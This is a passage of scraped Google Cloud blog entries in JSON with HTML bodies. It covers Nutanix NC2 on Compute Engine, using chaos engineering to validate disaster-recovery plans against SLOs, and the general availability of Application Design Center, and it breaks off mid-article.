partnership with Google Cloud and Nutanix.” </span><span style=\"vertical-align: baseline;\">- VP of IT at a global oil &amp; gas company based in Oklahoma</span></p>\n<h3><span style=\"vertical-align: baseline;\">The architecture </span></h3>\n<p><span style=\"vertical-align: baseline;\">NC2 on Compute Engine simplifies building a hybrid cloud by deploying the Nutanix Cloud Infrastructure (NCI) software stack, including the Acropolis Hypervisor (AHV), directly onto high-performance Compute Engine infrastructure.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_dJgDPX1.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The key components of the solution include:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Compute Engine instances:</strong><span style=\"vertical-align: baseline;\"> NC2 runs on </span><a href=\"https://docs.cloud.google.com/compute/docs/instances/bare-metal-instances\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Compute Engine bare metal instances</span></a><span style=\"vertical-align: baseline;\"> in the recently introduced C4 and Z3 machine families.</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">These powerful instances provide the foundation with high-density compute, memory, local NVMe storage, and high network bandwidth.</span></p>\n</li>\n</ul>\n<div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong><span style=\"vertical-align: baseline;\">Machine Family </span></strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong><span style=\"vertical-align: baseline;\">GCE Machine Type</span></strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\"><strong>vCPUs</strong> </span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\"><strong>Memory</strong>  </span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\"><strong>Storage</strong> </span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\"><strong>Processor</strong> </span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Z3, Storage Optimized </span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">z3-highmem-192-highlssd-metal</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">192</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">1536GB</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">72TB of NVMe Local SSD</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Intel, Sapphire Rapid</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C4, General Purpose </span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">c4-highmem-288-lssd-metal</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">288</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">1080GB</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">18TB of NVMe Local SSD</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Intel, Granite Rapid</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C4, General Purpose </span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">c4-standard-288-lssd-metal</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">288</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2232GB</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">18TB of NVMe Local SSD</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Intel, Granite Rapid</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Simplified networking :</strong><span style=\"vertical-align: baseline;\"> NC2 runs entirely within your existing Google Cloud Virtual Private Cloud (</span><strong style=\"vertical-align: baseline;\">VPC</strong><span style=\"vertical-align: baseline;\">). Built-in Nutanix Flow Virtual Networking for overlay is integrated to reduce hybrid cloud complexity. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Unified management:</strong><span style=\"vertical-align: baseline;\"> The entire environment, both on-premises and in Google Cloud, is managed through the familiar</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">Prism Central</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">console, simplifying day-to-day operations and skill requirements for your IT teams.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Easy procurement:</strong><span style=\"vertical-align: baseline;\"> Later this month, you’ll be able to purchase Nutanix NC2 licensing directly from </span><a href=\"https://cloud.google.com/marketplace?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Marketplace</span></a><span style=\"vertical-align: baseline;\"> . This offers a single, unified billing experience for both your Google Cloud infrastructure and Nutanix NC2, in one simple process. A key benefit is the ability to use your existing Google Cloud spend commitments for Nutanix NC2 software. This helps you maximize your investment and streamline your financial operations, providing more value from your cloud budget.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Connect your data to Google Cloud AI and analytics</strong></h3>\n<p><span style=\"vertical-align: baseline;\">A significant modernization opportunity comes from connecting your stable, trusted Nutanix workloads with Google Cloud's powerful data and AI tools. Your applications running on NC2 can tap directly into services like </span><strong style=\"vertical-align: baseline;\">BigQuery</strong><span style=\"vertical-align: baseline;\"> and </span><strong style=\"vertical-align: baseline;\">Vertex AI</strong><span style=\"vertical-align: baseline;\"> with low latency, enabling you to:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Derive deeper business value:</strong><span style=\"vertical-align: baseline;\"> Easily send application log data, transactional records, and other operational data from your Nutanix VMs to BigQuery for real-time, scalable data warehousing and complex analysis.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Build custom machine learning models:</strong><span style=\"vertical-align: baseline;\"> Use Vertex</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">AI to create, deploy, and manage custom ML models that analyze data generated by your core applications (e.g., predictive maintenance or fraud detection).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Use conversational AI:</strong><span style=\"vertical-align: baseline;\"> Quickly build and deploy conversational agents using technologies like Dialogflow that interact directly with the application data residing on your NC2 cluster.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Ready to simplify your cloud operations?</strong></h3>\n<p><span style=\"vertical-align: baseline;\">NC2 on Google Cloud is currently available  across 17 Google Cloud regions, with a planned expansion continuing through 2026. For precise details on regional and zonal availability, please check the official </span><a href=\"https://docs.cloud.google.com/compute/docs/instances/bare-metal-instances#regions_zones\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Compute Engine bare metal regional availability</span></a><span style=\"vertical-align: baseline;\"> documentation, and reference the </span><a href=\"https://cloud.google.com/compute/all-pricing?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Compute Engine pricing page</span></a><span style=\"vertical-align: baseline;\"> for infrastructure costs. To learn more about the solution, try taking a </span><a href=\"https://cloud.nutanixtestdrive.com/login?type=nc2gcp\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">test drive</span></a><span style=\"vertical-align: baseline;\"> or visit </span><a href=\"https://cloud.google.com/find-a-partner/partner/nutanix-inc\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Nutanix partner page</span></a><span style=\"vertical-align: baseline;\">. Available later this month, you will be able to explore NC2 on Google Cloud licensing through the Google Cloud Marketplace.</span></p></div>",
        "published_date": "2025-12-09 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/devops-sre/using-chaos-engineering-to-test-dr-plans/",
        "title": "Is your DR plan just wishful thinking? Prove your resilience with chaos engineering",
        "thumbnail": null,
        "author": "Deepanshu Kalra",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">When was the last time you </span><span style=\"font-style: italic; vertical-align: baseline;\">knew — </span><span style=\"vertical-align: baseline;\">not just </span><span style=\"font-style: italic; vertical-align: baseline;\">hoped</span><span style=\"vertical-align: baseline;\"> — that your disaster recovery plan would work perfectly?</span></p>\n<p><span style=\"vertical-align: baseline;\">For most of us, the answer is unclear. Sure, you may have a DR plan, a meticulously crafted document stored in a wiki or a shared drive, that gets dusted off for compliance audits or the occasional tabletop drill. You assume its procedures are correct, its contact lists are current, and its dependencies are fully mapped, and you certainly </span><span style=\"font-style: italic; vertical-align: baseline;\">hope</span><span style=\"vertical-align: baseline;\"> it works.</span></p>\n<p><span style=\"vertical-align: baseline;\">But </span><a href=\"https://sre.google/prodverbs/?slide=10\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">hope is not a strategy</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Why wouldn’t it work? One problem is that systems are rarely static anymore. In a world where you deploy new microservices dozens of times per day, make constant configuration changes, and maintain an ever-growing web of third-party API dependencies, the DR plan you wrote last quarter is probably just as useful as one from 10 years ago. </span></p>\n<p><span style=\"vertical-align: baseline;\">And if the failover does work, will it work well enough to meet the promises you've made to your customers (or board of directors or regulators)? When a key component fails, could you still even meet your target availability and latency targets, a.k.a., your Service Level Objectives (SLOs)?</span></p>\n<p><span style=\"vertical-align: baseline;\">So, how do you close this gap between your current aspirational DR plan and a DR plan that you actually have confidence in? The answer isn't to write more documents or run more theatrical drills. The answer is to stop </span><span style=\"font-style: italic; vertical-align: baseline;\">assuming</span><span style=\"vertical-align: baseline;\"> and start </span><span style=\"font-style: italic; vertical-align: baseline;\">proving</span><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">This is where chaos engineering comes in. Unlike what the name might imply, chaos engineering isn’t a tool for recklessly breaking things. Instead, it’s a framework that provides data-driven confidence in your SLOs under stress. By running controlled experiments that simulate real-world disasters like a database failover or a regional outage, you can quantitatively measure the impact of those failures on your systems’ performance. Chaos engineering is how you transform your DR hypotheses into a proven method to ensure resilience. By validating your plan through experimentation, you create tangible evidence, verifying that your plan will safeguard your infrastructure and keep your promises to customers.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Demystifying chaos engineering</strong></h3>\n<p><span style=\"vertical-align: baseline;\">In a nutshell, chaos engineering is the practice of running controlled, scientific experiments to find weaknesses in your system before they cause a real outage. </span></p>\n<p><span style=\"vertical-align: baseline;\">At its core, it’s about building confidence in your system’s resilience. The process starts with understanding your system's </span><strong style=\"vertical-align: baseline;\">steady state</strong><span style=\"vertical-align: baseline;\">, which is its normal, measurable, and healthy output. You can't know the true impact of a failure without first defining what \"good\" looks like. This understanding allows you to form a clear, testable </span><strong style=\"vertical-align: baseline;\">hypothesis</strong><span style=\"vertical-align: baseline;\">: a statement of belief that your system's steady state will persist even when a specific, turbulent condition is introduced.</span></p>\n<p><span style=\"vertical-align: baseline;\">To test this hypothesis, you then execute a controlled </span><strong style=\"vertical-align: baseline;\">action</strong><span style=\"vertical-align: baseline;\">, which is a precise and targeted failure injected into the system. This isn't random mischief; it's a specific simulation of real-world failures, such as consuming all CPU on a host (</span><strong style=\"vertical-align: baseline;\">resource exhaustion</strong><span style=\"vertical-align: baseline;\">), adding network latency (</span><strong style=\"vertical-align: baseline;\">network failure</strong><span style=\"vertical-align: baseline;\">), or terminating a virtual machine (</span><strong style=\"vertical-align: baseline;\">state failure</strong><span style=\"vertical-align: baseline;\">). While this action is running, automated </span><strong style=\"vertical-align: baseline;\">probes</strong><span style=\"vertical-align: baseline;\"> act as your scientific instruments, continuously monitoring the system's state to measure the effect. </span></p>\n<p><span style=\"vertical-align: baseline;\">Together, these components form a complete scientific loop: you use a </span><strong style=\"vertical-align: baseline;\">hypothesis</strong><span style=\"vertical-align: baseline;\"> to predict resilience, run an experiment by applying an </span><strong style=\"vertical-align: baseline;\">action</strong><span style=\"vertical-align: baseline;\"> to simulate adversity, and use </span><strong style=\"vertical-align: baseline;\">probes</strong><span style=\"vertical-align: baseline;\"> to measure the impact, turning uncertainty into hard data.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Using chaos to validate disaster recovery plans</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Now that you understand the building blocks of a chaos experiment, you can build the bridge to your ultimate goal: transforming your DR plan from a document of hope into an evidence-based procedure. The key is to stop seeing your DR plan as a set of instructions and start seeing it for what it truly is: a collection of unproven hypotheses.</span></p>\n<p><span style=\"vertical-align: baseline;\">When you think about it, every significant statement in your DR document is a claim waiting to be tested. When your plan states, </span><span style=\"font-style: italic; vertical-align: baseline;\">\"The database will failover to the replica in under 5 minutes,\"</span><span style=\"vertical-align: baseline;\"> that isn't a fact, it's a </span><strong style=\"vertical-align: baseline;\">hypothesis</strong><span style=\"vertical-align: baseline;\">. When it says, </span><span style=\"font-style: italic; vertical-align: baseline;\">\"In the event of a regional outage, traffic will be successfully rerouted to the secondary region,\"</span><span style=\"vertical-align: baseline;\"> that's another hypothesis. Your DR plan is filled with these critical assumptions about how your system </span><span style=\"font-style: italic; vertical-align: baseline;\">should</span><span style=\"vertical-align: baseline;\"> behave under duress. Until you test them, they remain nothing more than educated guesses.</span></p>\n<p><span style=\"vertical-align: baseline;\">Chaos experiments are the ultimate validation tools, </span><strong style=\"vertical-align: baseline;\">live-fire drills</strong><span style=\"vertical-align: baseline;\"> that put your DR hypotheses to a real, empirical test. Instead of just talking through a scenario, you use controlled </span><strong style=\"vertical-align: baseline;\">actions</strong><span style=\"vertical-align: baseline;\"> to safely and precisely simulate the disaster. You're no longer asking \"what if?\"; you're actively measuring \"what happens when.\"</span></p>\n<p><span style=\"vertical-align: baseline;\">For example, imagine you have a DR plan for a regional outage. When you adopt chaos engineering, you break down that plan into a hypothesis and an experiment. For example:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">The hypothesis:</strong><span style=\"vertical-align: baseline;\"> \"In case our primary region </span><code style=\"vertical-align: baseline;\">us-central1</code><span style=\"vertical-align: baseline;\"> becomes unreachable, the load balancers will failover all traffic to </span><code style=\"vertical-align: baseline;\">us-east1</code><span style=\"vertical-align: baseline;\"> within 3 minutes, with an error rate below 1%.\"</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">The chaos experiment:</strong><span style=\"vertical-align: baseline;\"> Run an </span><strong style=\"vertical-align: baseline;\">action</strong><span style=\"vertical-align: baseline;\"> that simulates a regional outage by injecting a \"blackhole\" that drops all network traffic to and from </span><code style=\"vertical-align: baseline;\">us-central1</code><span style=\"vertical-align: baseline;\"> for a limited time. Your </span><strong style=\"vertical-align: baseline;\">probes</strong><span style=\"vertical-align: baseline;\"> then measure the actual failover time and error rates to validate the hypothesis.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">In other words, by applying the chaos engineering methodology, you systematically move through your DR plan, turning each assumption into a proven fact. You're not just testing your plan; you're forging it in a controlled fire.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Connecting chaos readiness to your SLOs</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Beyond simply proving system availability, chaos engineering builds trust in your reliability metrics, ensuring that you meet your SLOs even when services become unavailable. An SLO is a specific, acceptable target level of your service's performance measured over a specified period that reflects the user's experience. SLOs aren't just internal goals; they are the bedrock of customer trust and the foundation of your contractual service level agreements (SLAs).</span></p>\n<p><span style=\"vertical-align: baseline;\">A traditional DR drill might get a \"pass\" because the backup system came online. But what if it took 20 minutes to fail over, during which every user saw errors? What if the backup region was under-provisioned, and performance became so slow that the service was unusable? From a technical perspective, you \"recovered.\" But from a customer's perspective, you were down.</span></p>\n<p><span style=\"vertical-align: baseline;\">A chaos experiment, however, can help you answer a critical question: </span><strong style=\"vertical-align: baseline;\">\"During a failover, did we still meet our SLOs?” </strong><span style=\"vertical-align: baseline;\">Because your probes are constantly measuring performance against your SLOs, you get the full picture. You don't just see that the database failed over; you see that it took 7 minutes, during which your latency SLO was breached and your </span><a href=\"https://sre.google/sre-book/embracing-risk/#:~:text=Forming%20Your%20Error%20Budget,new%20releases%20can%20be%20pushed.\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">error budget</span></a><span style=\"vertical-align: baseline;\"> was completely burned. This is the crucial, game-changing insight. It shifts the entire goal from simple disaster recovery to </span><strong style=\"vertical-align: baseline;\">SLO preservation</strong><span style=\"vertical-align: baseline;\">, which is what actually determines if a failure was a minor hiccup or a major business-impacting incident. It also provides the data necessary to set goals for system improvement. So the next time you run this experiment, you can measure if and how much your system resilience has improved, and ultimately if you can maintain your SLO during the disaster event.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Build a culture of confidence</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The journey to resilience doesn't start by simulating a full regional failover. It starts with a single, small experiment. The goal is not to boil the ocean; it's to build momentum. Test one timeout, one retry mechanism, or one graceful error message.</span></p>\n<p><span style=\"vertical-align: baseline;\">The biggest win from your first successful experiment won't be the technical data you gather. It will be the confidence you build. When your team sees that they can safely inject failure, learn from it, and improve the system, their entire relationship with failure changes. Fear is replaced by curiosity. That confidence is the catalyst for building a true, enduring culture of resilience. To learn more and get started with chaos engineering, check out </span><a href=\"https://cloud.google.com/blog/products/devops-sre/getting-started-with-chaos-engineering?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this blog</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://sre.google/prodcast/#season3-episode12\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this podcast</span></a><span style=\"vertical-align: baseline;\">. And if you’re ready to get started, but unsure how, reach out to Google Cloud professional services to discuss how we can help.</span></p></div>",
        "published_date": "2025-12-08 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/application-development/application-design-center-now-ga/",
        "title": "Streamline the design and deployment of application infrastructure with Application Design Center, now GA",
        "thumbnail": null,
        "author": "Vijay Potharla",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Earlier this year, we unveiled a big investment in platform and developer team productivity, with the launch of </span><a href=\"https://docs.cloud.google.com/application-design-center/docs/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Application Design Center</span></a><span style=\"vertical-align: baseline;\">, </span><span style=\"vertical-align: baseline;\">helping them streamline </span><span style=\"vertical-align: baseline;\">the design and deployment of cloud application infrastructure, while ensuring applications are secure, reliable, and aligned with best practices</span><span style=\"vertical-align: baseline;\">. And today, Application Design Center is generally available.</span></p>\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">We built Application Design Center to put applications at the center of your cloud experience, with a visual, canvas-style and AI-powered approach to design and modify Terraform-backed application templates. It also offers full lifecycle management that’s aligned with DevOps best practices across application design and deployment.</span></p>\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Application Design Center is a core component of our </span><a href=\"https://docs.cloud.google.com/hub/docs/application-centric-google-cloud\"><span style=\"text-decoration: underline; vertical-align: baseline;\">application-centric cloud experience</span></a><span style=\"vertical-align: baseline;\">. When you use Application Design Center to design and deploy your application infrastructure, your applications are easily discoverable, observable, and manageable. Application Design Center works in concert with </span><a href=\"https://cloud.google.com/app-hub/docs/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">App Hub</span></a><span style=\"vertical-align: baseline;\"> to automatically register application deployments, enabling a unified view and control plane for your application portfolio, and </span><a href=\"https://docs.cloud.google.com/hub/docs/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Hub</span></a><span style=\"vertical-align: baseline;\">, to provide operational insights for your applications.</span></p>\n<p style=\"text-align: justify; padding-left: 40px;\"><span style=\"font-style: italic; vertical-align: baseline;\">“Google Application Design Center is a valuable enabler for Platform Engineering, providing a structured approach to harmonizing resource creation in Google Cloud Platform. By aligning tools, processes, and technologies, it streamlines workflows, reducing friction between development, operations, and other teams. This harmonization enhances collaboration, accelerates delivery, and ensures consistency across Google Cloud environments.”</span><span style=\"vertical-align: baseline;\"> - </span><strong style=\"vertical-align: baseline;\">Ervis Duraj, Principal Engineer,</strong><span style=\"vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\">MediaMarktSaturn Technology</strong></p>\n<h3><span style=\"vertical-align: baseline;\">The gateway to an app-centric cloud</span></h3>\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Our goal with Application Design Center is for you to innovate more, and administer less. It consists of </span><span style=\"vertical-align: baseline;\">four key elements to help you minimize administrative overhead and maximize efficiency, so you can design and deploy applications with integrated best practices and essential guardrails. Let’s take a closer look.</span></p>\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">1. </span><strong style=\"vertical-align: baseline;\">Terraform </strong><a href=\"https://docs.cloud.google.com/application-design-center/docs/supported-resources\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">components</strong></a><strong style=\"vertical-align: baseline;\"> and </strong><a href=\"https://docs.cloud.google.com/application-design-center/docs/design-application-templates\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">application templates</strong></a><strong style=\"vertical-align: baseline;\"> <br /></strong><span style=\"vertical-align: baseline;\">Develop applications faster with our growing library of opinionated application templates. These provide well-architected patterns and pre-built components, including innovative \"AI inference templates\" to help you leverage AI to create dynamic and intelligent application foundations. As an example, at launch, Application Design Center provides opinionated templates for Google Kubernetes Engine (GKE) clusters (</span><a href=\"https://docs.cloud.google.com/application-design-center/docs/configure-gke-standard-cluster\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Standard</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://docs.cloud.google.com/application-design-center/docs/configure-gke-autopilot-cluster\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Autopilot</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://docs.cloud.google.com/application-design-center/docs/configure-gke-node-pool\"><span style=\"text-decoration: underline; vertical-align: baseline;\">NodePool</span></a><span style=\"vertical-align: baseline;\">) to run AI inference workloads using a variety of LLM models, as well as for enterprise-grade production clusters or single-region web app clusters. </span></p>\n<p><span style=\"vertical-align: baseline;\">You can also </span><a href=\"https://docs.cloud.google.com/application-design-center/docs/import-components\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ingest and manage your existing Terraform configurations</span></a><span style=\"vertical-align: baseline;\"> (“Bring your own Terraform”) directly from Git repositories. Once imported, you can use Application Design Center to design with your own Terraform, or in combination with Google-provided Terraform, to create standardized, opinionated infrastructure patterns for sharing and reuse across your application teams.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3- Catalog Share\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/3-_Catalog_Share.gif\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">2. </span><strong style=\"vertical-align: baseline;\">AI-powered design for rapid application designing and prototyping <br /></strong><span style=\"vertical-align: baseline;\">Application Design Center integrates with Google's </span><a href=\"https://cloud.google.com/gemini/docs/cloud-assist/design-application\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Cloud Assist Design Agent,</span></a><span style=\"vertical-align: baseline;\"> empowering you to design actual, deployable application infrastructure application templates on Google Cloud that you can export as Terraform infrastructure-as-code. </span></p>\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">With Gemini Cloud Assist, you can describe your application design intents using natural language. In return, Gemini interactively generates multi-product application template suggestions, complete with visual architecture diagrams and summarized benefits. You can then refine these proposals through multi-turn reasoning or by directly manipulating the architecture within the Application Design Center canvas. </span></p>\n<p><span style=\"vertical-align: baseline;\">Additionally, all designs that you create with Gemini are automatically observable, optimizable, and enabled for troubleshooting assistance during runtime, thanks to their tight integration with </span><a href=\"https://cloud.google.com/products/gemini/cloud-assist?hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Cloud Assist</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1-Components and templates\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/1-Components_and_templates.gif\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">3. </span><strong style=\"vertical-align: baseline;\">A secure, sharable catalog of application templates with full lifecycle management<br /></strong><span style=\"vertical-align: baseline;\">Platform admins can curate a collection of application templates built from Google's best-practice components. This provides developers a trusted, self-service experience from which they can quickly discover and deploy compliant applications. Tight integration with </span><a href=\"https://docs.cloud.google.com/hub/docs/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Hub</span></a><span style=\"vertical-align: baseline;\"> transforms these governed templates into a live operational command center, complete with unified visibility into the health and deployment status of the resulting applications. This closes the critical loop between design and runtime, so that your production environments reflect your organization’s approved architectural standards.</span></p>\n<p><span style=\"vertical-align: baseline;\">Also, Application Design Center’s robust </span><a href=\"https://docs.cloud.google.com/application-design-center/docs/manage-application-instances#create-application-revision\"><span style=\"text-decoration: underline; vertical-align: baseline;\">application template revisions</span></a><span style=\"vertical-align: baseline;\"> serve as an immutable audit trail. It automatically detects and flags configuration drift between your intended designs and deployed applications, so that developers can remediate unauthorized changes or safely push approved configuration updates. This helps ensure continuous state consistency and compliance from Day 1 and through the subsequent evolution of your application.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2-Design Agent\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/2-Design_Agent.gif\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">4. </span><strong style=\"vertical-align: baseline;\">GitOps integration automating developers’ day-to-day software design lifecycle tasks <br /></strong><span 